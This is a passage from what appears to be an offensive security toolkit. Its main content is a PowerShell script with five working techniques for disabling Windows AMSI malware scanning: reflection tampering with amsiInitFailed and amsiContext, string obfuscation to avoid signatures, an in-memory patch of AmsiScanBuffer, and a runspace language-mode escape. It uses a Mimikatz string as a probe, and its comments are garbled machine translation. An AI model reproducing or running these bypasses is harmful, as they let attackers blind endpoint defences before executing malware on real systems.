echo "no command execution function available (check disable_functions)";
````

#### `m05-amsi-bypass-variants.ps1` {#m05-amsi-bypass-variants-ps1}

````powershell
<#
Use: AMSI Multiple experimental versions processed by host（PowerShell / WSH / .NET）Select Match Achievement
scene: 3、7、10、18、19（and M05 All scenes PowerShell Front of the route）
Dependency: PowerShell 3.0+；Partial version requires reflect permission（CLM It'll fail. See you. m05-clm-bypass-runspace.ps1）
Use: powershell -ep bypass -f m05-amsi-bypass-variants.ps1 -Variant 1
      or in an existing session: . .\m05-amsi-bypass-variants.ps1; Invoke-AmsiVariant -Variant 2
Placeholder: None (pure local operation, not involved) LHOST/LPORT）
Test status: Not present Windows Measurement; syntax has been manually checked. The test must be tested on a case-by-case basis in an experimental environment.
Annotations: 
  - AMSI The treatment changes with the patch, and the failure of one version does not mean that the technology is not available.。
  - First."The probe."Decision AMSI Whether or not to enter into force, to decide whether to proceed。
  - PowerShell Host PS Version；WSH（.js/.vbs）I have to. WSH It's a special version. It can't be copied.。
#>
[CmdletBinding()]
param(
    [ValidateSet(1, 2, 3, 4, 5, 6)][int]$Variant = 1,
    [switch]$ProbeOnly
)

function Test-AmsiActive {
    <#
    Innocence probe: includes AMSI Always sweeps the feature string. If you're stopped, explain. AMSI Entry into force。
    #>
    $probe = 'Invoke-Mimikatz'
    $marker = 'AmsiUtils' + 'amsiInitFailed'
    Write-Output ("[*] Probe String: {0} / {1}" -f $probe, $marker)
    try {
        $sb = [scriptblock]::Create($probe)
        Write-Output "[+] The probe is not intercepted.（AMSI May not be effective or have been addressed）"
        return $false
    } catch {
        Write-Output ("[!] The probe is intercepted.: {0}" -f $_.Exception.Message)
        return $true
    }
}

function Invoke-AmsiVariant {
    param([int]$Variant)

    Write-Output ("[*] Apply AMSI Process Version {0}" -f $Variant)

    switch ($Variant) {
        1 {
            # Version 1: Reflection Settings amsiInitFailed（It's classic. It's always stopped, but try first.）
            try {
                $a = [Ref].Assembly.GetTypes() | Where-Object { $_.Name -like '*iUtils' }
                $f = $a.GetFields('NonPublic,Static') | Where-Object { $_.Name -like '*Failed' }
                $f.SetValue($null, $true)
                Write-Output "[+] Version 1 Completed"
            } catch { Write-Output ("[-] Version 1 Failed: {0}" -f $_.Exception.Message) }
        }
        2 {
            # Version 2: Avoid static features by string spell
            try {
                $s = 'S'+'y'+'s'+'t'+'e'+'m'+'.'+'M'+'a'+'n'+'a'+'g'+'e'+'m'+'e'+'n'+'t'+'.'+'A'+'u'+'t'+'o'+'m'+'a'+'t'+'i'+'o'+'n'
                $t = [type]($s + '.AmsiUtils')
                $f = $t.GetField('amsiInitFailed', 'NonPublic,Static')
                $f.SetValue($null, $true)
                Write-Output "[+] Version 2 Completed"
            } catch { Write-Output ("[-] Version 2 Failed: {0}" -f $_.Exception.Message) }
        }
        3 {
            # Version 3: Destruction amsiContext（Reflect empty context）
            try {
                $t = [Ref].Assembly.GetType(('System.Management.Automation.'+'AmsiUtils'))
                $ctx = $t.GetField('amsiContext', 'NonPublic,Static')
                $ctx.SetValue($null, [IntPtr]::Zero)
                Write-Output "[+] Version 3 Completed"
            } catch { Write-Output ("[-] Version 3 Failed: {0}" -f $_.Exception.Message) }
        }
        4 {
            # Version 4: Memory Patch AmsiScanBuffer The first bytes should read ret）
            try {
                $k = @"
using System;
using System.Runtime.InteropServices;
public class P {
    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string n);
    [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string n);
    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint f, out uint o);
    public static void Patch() {
        IntPtr lib = LoadLibrary("amsi.dll");
        IntPtr addr = GetProcAddress(lib, "AmsiScanBuffer");
        uint old;
        VirtualProtect(addr, (UIntPtr)5, 0x40, out old);
        byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; // mov eax,0x80070057; ret
        Marshal.Copy(patch, 0, addr, patch.Length);
    }
}
"@
                Add-Type -TypeDefinition $k -ErrorAction Stop
                [P]::Patch()
                Write-Output "[+] Version 4 Completed (to allow) Add-Type）"
            } catch { Write-Output ("[-] Version 4 Failed（Add-Type Could be stopped.）: {0}" -f $_.Exception.Message) }
        }
        5 {
            # Version 5: Custom Runspace Internal Version（CLM Co-use in Environment）
            try {
                $rs = [runspacefactory]::CreateRunspace()
                $rs.Open()
                $ps = [powershell]::Create()
                $ps.Runspace = $rs
                [void]$ps.AddScript({ $ExecutionContext.SessionState.LanguageMode = 'FullLanguage' })
                [void]$ps.Invoke()
                Write-Output "[+] Version 5 Completed (new) Runspace Language mode has been released）"
            } catch { Write-Output ("[-] Version 5 Failed: {0}" -f $_.Exception.Message) }
        }
        6 {
            # Version 6: Not processed, only reported (for comparison experiments)）
            Write-Output "[*] Version 6: No processing, as a control group"
        }
    }
}

if ($ProbeOnly) {
    [void](Test-AmsiActive)
} else {
    [void](Test-AmsiActive)
    Invoke-AmsiVariant -Variant $Variant
    Write-Output ""
    Write-Output "[*] Repeat: "
    [void](Test-AmsiActive)
    Write-Output "[*] Hint: Version 1/2/3 In the reflect class, patches often fail; version 4 Yes. Add-Type；"
    Write-Output "    Version 5 and CLM circumventing collaboration; consider moving to hosting set or not when all lapses PowerShell Route。"
}
````

